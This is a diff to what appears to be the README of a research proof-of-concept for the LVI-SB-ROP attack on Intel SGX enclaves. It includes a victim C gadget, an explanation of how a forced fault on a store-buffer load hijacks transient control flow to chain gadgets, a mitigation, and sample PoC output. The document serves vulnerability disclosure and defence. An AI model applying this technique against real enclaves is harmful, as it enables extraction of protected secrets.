@@ -181,3 +181,81 @@ Flush+Reload Threshold: 226
 +-------------------------------------------------------------------------------------------+
 A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A 
 ```
+
+## LVI-SB-ROP: Transient control flow hijacking
+
+Consider the minimal example code gadget below:
+
+--------------------------------------------------------------------------------
+```C
+1 void ecall_lvi_store_user(uint64_t *user_pt, uint64_t user_val, char *oracle)
+2 {
+3   *user_pt = user_val;    /* VICTIM STORE: write user-controlled value to extra-enclave user memory */
+4   return;                 /* VICTIM LOAD: inject from user store 4K alias (i.e., control flow hijack) */
+6 }
+```
+--------------------------------------------------------------------------------
+
+**Attack procedure.** We again rely on an attacker-controlled user pointer
+dereference inside the enclave. Where the above LVI variant faulted on user
+memory loads, we now provoke page faults on legitimate enclave memory load
+instructions.  Specifically we require that the enclave first stores a
+(user-controlled) value to a user-controlled untrusted address (line 3).
+Subsequently, the enclave "return" statement performs a _legit_ load from the
+enclave stack (line 4) and uses that value as a trusted return address to
+redirect control flow.
+
+Architecturally the enclave will always follow the intended control/data flow,
+but an SGX page table adversary may force the legit load on line (4) to fault
+and read the untrusted attacker value from the store buffer instead of from
+trusted enclave memory. The transient instructions following the faulting load
+will now compute on the value from the store buffer and hence redirect
+transient control flow to an arbitrary attacker-controlled location. Much like
+Spectre v2 branch poisoning attacks, this ultimately allows attackers to abuse
+"2nd-stage gadgets" in the existing enclave code base to dereference arbitrary
+secrets and encode them in the microarchitectural CPU state.
+
+Note that for clarity we focused on hijacking RET control flow in the above
+example, but we also demonstrated successful LVI attacks for JMP/CALL indirect
+control flow instructions. This effectively shows that we can arbitrarily
+hijack transient return control flow, even in the presence of strong
+Spectre-RSB/BTB mitigations that flush shared RSB/BTB buffers on enclave entry.
+Interestingly, we also found that large or multiple user stores enable
+attackers to setup a fake "transient stack" in the store buffer so as to
+repeatedly inject illegal values for consecutive enclave stack loads (POP/RET
+sequences). Much like in architectural ROP, such capability allows to chain
+together multiple 2nd stage gadgets to compose arbitrary transient computations
+of interest.
+
+**Suggested mitigation.** Insert LFENCE instructions after loading branch target addresses from trusted memory, and before redirecting control flow. Break up x86 `ret` instructions into explicit load and branch instructions.
+
+**Proof-of-concept code.** Enable this PoC through `#define LVI_SB_ROP 1` in `main.c`. Example output for `make run` as follows (on a processor vulnerable to [Fallout](https://mdsattacks.com/)/[MSBDS](https://software.intel.com/security-software-guidance/insights/deep-dive-intel-analysis-microarchitectural-data-sampling)):
+
+``` $ make run
+Flush+Reload Threshold: 227
+[sched.c] continuing on CPU 1
+[main.c] Creating enclave...
+==== Victim Enclave ====
+[pt.c] /dev/sgx-step opened!
+    Base:   0x7f8e67000000
+    Size:   8388608
+    Limit:  0x7f8e67800000
+    TCS:    0x7f8e67481000
+    SSA:    0x7f8e67482f48
+    AEP:    0x7f8e695fa845
+    EDBGRD: debug
+[main.c] oracle at 0x563fd9561000
+[main.c] user_page at 0x563fd9661000
+[main.c] enclave_page_a at 0x7f8e6721e000 w PTE
+[pt.c] /dev/mem opened!
++-------------------------------------------------------------------------------------------+
+| XD | PK | IGN | RSVD | PHYS ADRS      | IGN | G | PAT | D | A | PCD | PWT | U/S | R/W | P | 
+| 0  | x  | x   | 0    | 0x00007053e000 | x   | x | x   | 1 | 1 | x   | x   | 1   | 1   | 1 | 
++-------------------------------------------------------------------------------------------+
+[main.c] enclave_page_b at 0x7f8e6721d000 w PTE
++-------------------------------------------------------------------------------------------+
+| XD | PK | IGN | RSVD | PHYS ADRS      | IGN | G | PAT | D | A | PCD | PWT | U/S | R/W | P | 
+| 0  | x  | x   | 0    | 0x00007053f000 | x   | x | x   | 1 | 1 | x   | x   | 1   | 1   | 1 | 
++-------------------------------------------------------------------------------------------+
+R R R R R R R R R R R R R R R R R R R R R R R R R R R R R R R R R R R R R R R R R R R R R R R R R
+```
